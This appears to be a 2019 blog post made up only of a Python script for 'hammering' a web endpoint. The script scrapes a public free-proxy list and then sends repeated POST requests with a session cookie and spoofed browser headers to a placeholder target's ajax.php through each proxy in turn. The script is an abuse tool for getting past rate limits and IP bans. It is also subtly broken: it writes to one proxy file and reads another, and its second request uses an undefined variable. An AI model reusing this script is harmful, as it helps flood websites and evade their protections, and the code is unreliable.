---
layout: post
title: hammer some resource via free proxies
date: 2019-11-13 13:32:31.000000000 +00:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories: []
tags: []
permalink: "/2019/11/hammer-some-resource-via-free-proxies/"
---
<!-- wp:code -->

```
#!/usr/bin/env python3
import sys,requests,time
from bs4 import BeautifulSoup

proxies = None
if(len(sys.argv)==2 and sys.argv[1]=='r'):
    temp = sys.stdout
    sys.stdout = open('proxies.txt','w')
    res = requests.get('https://free-proxy-list.net/', headers={'User-Agent': 'Mozilla/5.0 (Macintosh) Firefox', 'Referer': 'https://www.google.com/search'})
    soup = BeautifulSoup(res.text,"lxml")
    for items in soup.select("tbody tr"):
        proxies = ':'.join([item.text for item in items.select("td")[:2]])
        print(proxies)
    sys.stdout = temp

url = 'https://some.target/ajax.php'
h = {'User-Agent': 'Mozilla/5.0', 'Cookie': 'PHPSESSID=blabla', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'https://some.target/'}
d = {'somefield': 'somevalue', 'other': 'value'}

with open('proxies', 'r') as f:
    proxies = f.read().splitlines()
for p in proxies:
    print(p)
    try:
        response = requests.post(url, headers=h, data=d, proxies={"http": p, "https": p}, timeout=5)
        print(response.status_code, response.text)
    except (requests.exceptions.RequestException, requests.exceptions.Timeout) as e:
        print(e)
    time.sleep(1)
    try:
        response = requests.post(url, headers=h, data=dd, proxies={"http": p, "https": p}, timeout=5)
        print(response.status_code, response.text)
    except (requests.exceptions.RequestException, requests.exceptions.Timeout) as e:
        print(e)
```

<!-- /wp:code -->

